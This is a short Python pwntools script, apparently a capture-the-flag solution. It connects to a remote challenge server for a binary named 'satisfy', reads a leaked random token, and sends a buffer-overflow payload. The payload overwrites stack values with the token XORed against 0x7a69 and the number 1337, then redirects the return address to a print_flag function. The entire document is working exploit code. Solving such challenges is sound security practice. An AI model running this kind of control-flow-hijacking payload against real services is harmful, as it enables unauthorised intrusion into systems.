from pwn import *

elf = ELF("./satisfy")
#p = process(elf.path)
p = remote("0.cloud.chals.io", 34720)

print_flag = 0x0000000004013aa

p.recvuntil(b"<<< Here is a random token ")
magic_number = int(p.recvline()[:-1].decode())
print(magic_number)

buf = b"A"*16
buf += p64(0)
buf += p64(magic_number ^ 0x7a69)
buf += p64(1337)
buf += p64(print_flag)

print(buf)

p.sendline(buf)
p.interactive()
